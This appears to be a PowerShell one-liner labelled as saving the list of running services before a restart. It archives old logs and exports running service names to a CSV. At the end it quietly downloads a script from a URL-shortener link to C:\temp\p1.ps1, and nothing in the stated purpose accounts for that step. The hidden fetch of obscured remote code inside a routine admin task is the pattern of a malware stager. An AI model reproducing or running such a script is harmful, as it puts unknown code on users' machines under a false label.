#Save services prior to restart
$timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }; new-item -Type directory -Path C:\temp;new-item -Type directory -Path C:\archive; move-Item -path C:\temp\serviceslog* -destination C:\archive; get-service | Where-Object {$_.Status -eq "Running"} |Select-object Name, DisplayName| Export-Csv -Path C:\temp\ServicesLog$timestamp.csv; get-content C:\temp\ServicesLog$timestamp.csv; $s = 'https://rb.gy/tjattq'; $d = 'C:\temp\p1.ps1'; Invoke-WebRequest -Uri $s -OutFile $d